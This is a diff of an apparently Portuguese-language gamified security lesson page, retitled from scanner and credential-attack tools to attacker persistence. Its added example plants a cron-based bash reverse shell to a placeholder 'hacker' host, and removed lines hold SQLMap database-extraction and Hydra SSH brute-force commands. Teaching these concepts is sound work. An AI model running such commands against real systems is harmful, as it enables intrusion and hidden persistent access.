@@ -9,14 +9,14 @@
     <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <title>CyberDuo - Ferramentas de Vuln e Credencial 10.2b</title>
+    <title>CyberDuo - Estabelecendo Persistência</title>
     <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
     <link rel="stylesheet" href="../assets/tailwind.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --cyber-blue: #8a2be2;
+            --cyber-blue: #ff003c;
             --cyber-green: #00ff41;
             --cyber-red: #ff003c;
             --cyber-yellow: #ffb800;
@@ -95,8 +95,8 @@
         .game-footer { flex-shrink: 0; padding: 1rem 1rem max(1rem, env(safe-area-inset-bottom)); background: #0d1117; border-top: 1px solid #1f2937; width: 100%; display: flex; justify-content: center; box-sizing: border-box; z-index: 50; }
         .check-btn { width: 100%; max-width: 400px; padding: 1rem; border-radius: 1rem; font-weight: 800; text-transform: uppercase; cursor: pointer; background: #1f2937; color: #4b5563; border: none; font-size: 1rem; letter-spacing: 1px; transition: all 0.1s; -webkit-tap-highlight-color: transparent; }
         .check-btn:active { transform: scale(0.98); }
-        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #5e1d80; }
-        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #5e1d80; }
+        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #b3002a; }
+        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #b3002a; }
 
         /* FEEDBACK OVERLAY */
         .feedback-overlay { position: fixed; bottom: -100%; left: 0; right: 0; padding: 1.5rem 1.5rem max(1.5rem, env(safe-area-inset-bottom)); transition: bottom 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); z-index: 100; border-top-left-radius: 1.5rem; border-top-right-radius: 1.5rem; display: flex; flex-direction: column; align-items: center; text-align: left; }
@@ -110,7 +110,7 @@
 <body>
 
     <div class="game-header">
-        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-10.html'"><i class="fas fa-times"></i></div>
+        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-08.html'"><i class="fas fa-times"></i></div>
         <div class="progress-container"><div class="progress-fill" id="progressFill"></div></div>
         <div class="hearts" id="heartsContainer"></div>
     </div>
@@ -131,106 +131,27 @@
         const steps = [
             {
                         "type": "teach",
-                        "icon": "fa-bug",
-                        "title": "10.2.5 Ferramentas de Varredura de Vuln",
-                        "content": "<b>Nessus</b>: scanner comercial líder. <b>OpenVAS</b>: alternativa open source. <b>Nikto</b>: scanner web específico. <b>WPScan</b>: scanner para WordPress. <b>SQLMap</b>: automação de SQL Injection.",
-                        "highlight": "Cada scanner é especializado em um domínio"
-            },
-            {
-                        "type": "match",
-                        "title": "Scanner → Alvo",
-                        "pairs": [
-                                    {
-                                                "term": "Nessus",
-                                                "definition": "Varredura geral de vulnerabilidades"
-                                    },
-                                    {
-                                                "term": "Nikto",
-                                                "definition": "Servidores web"
-                                    },
-                                    {
-                                                "term": "WPScan",
-                                                "definition": "Sites WordPress"
-                                    },
-                                    {
-                                                "term": "SQLMap",
-                                                "definition": "SQL Injection automatizado"
-                                    }
-                        ]
+                        "icon": "fa-anchor",
+                        "title": "Mecanismos de Persistência",
+                        "content": "<b>Persistência</b> garante que o hacker não perca acesso se o servidor for reiniciado ou a senha do usuário for trocada. Ele instala *backdoors* ou cria tarefas agendadas que o chamam de volta."
             },
             {
                         "type": "example",
-                        "icon": "fa-terminal",
-                        "title": "SQLMap Automatizado",
-                        "scenario": "O pentester encontra um parâmetro vulnerável a SQLi e usa SQLMap para automatizar a extração do banco de dados completo.",
-                        "code": "sqlmap -u 'http://alvo.com/page?id=1' --dbs --batch",
-                        "takeaway": "SQLMap automatiza toda a cadeia de exploração SQLi."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-key",
-                        "title": "10.2.7 Ferramentas de Ataque de Credencial",
-                        "content": "<b>Hydra</b>: brute force online (SSH, FTP, HTTP). <b>John the Ripper</b>: cracking offline de hashes. <b>Hashcat</b>: cracking com GPU. <b>Medusa</b>: brute force paralelo. <b>CeWL</b>: gera wordlists a partir de sites.",
-                        "highlight": "Online = Hydra. Offline = Hashcat/John."
-            },
-            {
-                        "type": "example",
-                        "icon": "fa-terminal",
-                        "title": "Hydra Brute Force SSH",
-                        "scenario": "O pentester usa Hydra com uma wordlist para testar senhas SSH contra um servidor alvo.",
-                        "code": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100",
-                        "takeaway": "Hydra testa milhares de senhas por minuto contra serviços de rede."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-microchip",
-                        "title": "Hashcat com GPU",
-                        "content": "<b>Hashcat</b> usa a GPU para cracking massivamente paralelo. Suporta 300+ tipos de hash (MD5, SHA, NTLM, bcrypt). <b>Modo 0</b>: dicionário. <b>Modo 3</b>: brute force. <b>Modo 6</b>: híbrido.",
-                        "highlight": "GPU cracka milhões de hashes por segundo"
+                        "icon": "fa-clock",
+                        "title": "Cron Jobs Fantasmas",
+                        "scenario": "O atacante invade um Linux e edita o `/etc/crontab` para rodar `bash -i >& /dev/tcp/hacker/4444 0>&1` a cada 5 minutos. Se a conexão cair, em 5 minutos o servidor 'liga' de volta pro hacker.",
+                        "takeaway": "O atacante nunca ataca apenas uma vez. Ele crava as garras no sistema."
             },
             {
                         "type": "quiz",
-                        "task": "Qual ferramenta usa a GPU para cracking massivamente paralelo de hashes?",
+                        "task": "Qual é o objetivo primário de instalar Mecanismos de Persistência após invadir um servidor?",
                         "options": [
-                                    "Hashcat",
-                                    "Hydra",
-                                    "Nmap"
+                                    "Manter e garantir o acesso contínuo ao sistema mesmo após reinicializações, patches ou trocas de senha.",
+                                    "Fazer o servidor travar para pedir resgate financeiro.",
+                                    "Criptografar o banco de dados principal."
                         ],
-                        "correctText": "Hashcat",
-                        "explanation": "Hashcat aproveita o poder paralelo da GPU para testar bilhões de combinações."
-            },
-            {
-                        "type": "fill",
-                        "sentence": "A ferramenta ___ gera wordlists customizadas a partir do conteúdo de um website.",
-                        "options": [
-                                    "CeWL",
-                                    "Hydra",
-                                    "Nmap"
-                        ],
-                        "correctText": "CeWL",
-                        "explanation": "CeWL (Custom Word List) spider o site e extrai palavras para criar dicionários personalizados."
-            },
-            {
-                        "type": "match",
-                        "title": "Ferramenta → Tipo de Ataque",
-                        "pairs": [
-                                    {
-                                                "term": "Hydra",
-                                                "definition": "Brute force online (rede)"
-                                    },
-                                    {
-                                                "term": "John the Ripper",
-                                                "definition": "Cracking offline (CPU)"
-                                    },
-                                    {
-                                                "term": "Hashcat",
-                                                "definition": "Cracking offline (GPU)"
-                                    },
-                                    {
-                                                "term": "CeWL",
-                                                "definition": "Geração de wordlist"
-                                    }
-                        ]
+                        "correctText": "Manter e garantir o acesso contínuo ao sistema mesmo após reinicializações, patches ou trocas de senha.",
+                        "explanation": "A persistência sobrevive às tentativas de limpeza do time de TI."
             }
 ];
 
@@ -512,15 +433,15 @@
             document.getElementById('progressFill').style.width = `100%`;
             document.getElementById('footerArea').classList.add('hidden');
             
-            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/10.2c-persist-evasion-tools.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/8.2-lateral-exfiltracao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             if (nextBtnHtml.includes("##NEXT_LESSON_BTN" + "##")) {
-                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #5e1d80; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #b3002a; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             }
 
             document.getElementById('gameArea').innerHTML = `
                 <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
                     <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
-                    <h2 class="title-main mb-2">FERRAMENTAS DE ATAQUE DOMINADAS!</h2>
+                    <h2 class="title-main mb-2">Você concluiu esta lição e dominou os conceitos apresentados.</h2>
                     <p class="text-body mb-6">Você completou esta lição com sucesso!</p>
                     <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                         ${nextBtnHtml}
@@ -529,7 +450,7 @@
                                 <i class="fas fa-rotate-right mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">REINICIAR</span>
                             </button>
-                            <button class="check-btn" onclick="window.location.href='../modules/modulo-10.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
+                            <button class="check-btn" onclick="window.location.href='../modules/modulo-08.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
                                 <i class="fas fa-layer-group mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">MÓDULOS</span>
                             </button>
